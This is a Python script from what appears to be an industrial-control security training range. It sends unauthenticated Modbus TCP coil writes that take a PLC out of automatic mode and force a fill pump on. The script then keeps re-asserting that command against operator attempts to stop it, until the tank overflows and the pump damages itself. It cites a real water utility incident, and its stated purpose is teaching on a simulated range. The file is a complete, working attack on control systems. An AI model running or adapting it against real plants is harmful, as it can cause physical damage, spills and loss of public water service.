#!/usr/bin/env python3
"""S03 — Unauthorised command, tank overflow.

Writes directly to the pump coil, overriding automatic control, and holds
the command until the tank spills and the pump damages itself. Mirrors the
Muleshoe TX incident, where remote access to an industrial interface
overflowed a municipal water tank.

Modbus TCP has no authentication. Nothing here exploits a software
vulnerability — the protocol is working exactly as designed. That is the
teaching point.

ATT&CK for ICS: T0855 Unauthorized Command Message, T0831 Manipulation of
Control, T0826 Loss of Availability.

Simulated range only. See SECURITY.md.
"""

from __future__ import annotations

import argparse
import sys
import time

from pymodbus.client import ModbusTcpClient

from attacker.common.scope import guard
from common.pointmap import load as load_pointmap

SCENARIO = "S03 — unauthorised command, tank overflow"
DEFAULT_PORT = 5502


class Session:
    """Thin point-map-aware wrapper so the attack reads like the writeup."""

    def __init__(self, client: ModbusTcpClient, map_path: str | None = None) -> None:
        self.client = client
        self.pm = load_pointmap(map_path) if map_path else load_pointmap()

    def read(self, tag: str) -> bool | float:
        p = self.pm[tag]
        if p.table == "coils":
            return bool(self.client.read_coils(p.index, count=1).bits[0])
        if p.table == "discrete_inputs":
            return bool(self.client.read_discrete_inputs(p.index, count=1).bits[0])
        if p.table == "input_registers":
            return p.decode(self.client.read_input_registers(p.index, count=1).registers[0])
        if p.table == "holding_registers":
            return p.decode(self.client.read_holding_registers(p.index, count=1).registers[0])
        raise ValueError(p.table)

    def write_coil(self, tag: str, value: bool) -> None:
        self.client.write_coil(self.pm[tag].index, value)


def run(
    host: str,
    port: int,
    timeout_s: float,
    poll_s: float,
    source_ip: str | None = None,
    map_path: str | None = None,
) -> int:
    target = guard(host, port, SCENARIO)

    source_address = (source_ip, 0) if source_ip else None
    client = ModbusTcpClient(target.connect_host, port=target.port, source_address=source_address)
    if not client.connect():
        print(f"[!] could not connect to {target.connect_host}:{target.port}")
        return 1

    session = Session(client, map_path)
    try:
        level = session.read("LT_101")
        mode_auto = session.read("MODE_AUTO")
        print(f"[*] baseline: level={level:.1f}%  mode_auto={mode_auto}  ")

        # Two writes are all it takes. Dropping the PLC out of automatic
        # control stops the level logic from ever commanding the pump off,
        # then the pump is commanded on directly.
        print("[*] writing MODE_AUTO = 0  (drop out of automatic control)")
        session.write_coil("MODE_AUTO", False)
        print("[*] writing P101_RUN  = 1  (force fill pump on)")
        session.write_coil("P101_RUN", True)

        print("[*] holding command, watching process impact...")
        deadline = time.time() + timeout_s
        overflow_at: float | None = None
        fault_at: float | None = None
        started = time.time()

        while time.time() < deadline:
            # Re-assert: an operator noticing the pump running may try to
            # stop it, and this keeps the attacker in control.
            session.write_coil("P101_RUN", True)

            level = session.read("LT_101")
            lshh = session.read("LSHH_101")
            alarm = session.read("ALARM_HORN")
            fault = session.read("P101_FAULT")
            current = session.read("IT_101")
            elapsed = time.time() - started

            if level >= 100.0 and overflow_at is None:
                overflow_at = elapsed
                print(
                    f"  [{elapsed:6.1f}s] TANK OVERFLOWING — level={level:.1f}% "
                    f"lshh={lshh} alarm={alarm}"
                )
            if fault and fault_at is None:
                fault_at = elapsed
                print(f"  [{elapsed:6.1f}s] PUMP FAULT — deadhead overload latched")
                break

            print(
                f"  [{elapsed:6.1f}s] level={level:5.1f}%  current={current:4.1f}A  "
                f"lshh={lshh}  alarm={alarm}"
            )
            time.sleep(poll_s)

        print("\n[+] impact summary")
        print(f"    tank overflow      : {'yes' if overflow_at else 'no'}", end="")
        print(f"  (at {overflow_at:.1f}s)" if overflow_at else "")
        print(f"    pump damaged       : {'yes' if fault_at else 'no'}", end="")
        print(f"  (at {fault_at:.1f}s)" if fault_at else "")
        print(
            "\n[i] Two coil writes from an unauthenticated source spilled the\n"
            "    tank and damaged the pump. No exploit, no malware — the\n"
            "    protocol has no way to tell this from a legitimate command."
        )
        return 0 if (overflow_at and fault_at) else 1
    finally:
        client.close()


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument(
        "--timeout", type=float, default=120.0, help="Give up after this many seconds"
    )
    parser.add_argument("--poll", type=float, default=2.0, help="Seconds between status polls")
    parser.add_argument(
        "--source-ip",
        default=None,
        help="Bind this source address, so the attacker is distinguishable from the HMI",
    )
    parser.add_argument(
        "--map",
        default=None,
        help=(
            "Point map to use (default plc/modbus-map.yml, for talking to "
            "process-sim directly). Pass plc/modbus-map-openplc.yml when "
            "--host targets OpenPLC/the M4 router instead — OpenPLC mirrors "
            "field I/O at different addresses; see that file's own comments."
        ),
    )
    return parser.parse_args(argv)


def main() -> int:
    args = parse_args()
    return run(args.host, args.port, args.timeout, args.poll, args.source_ip, args.map)


if __name__ == "__main__":
    sys.exit(main())
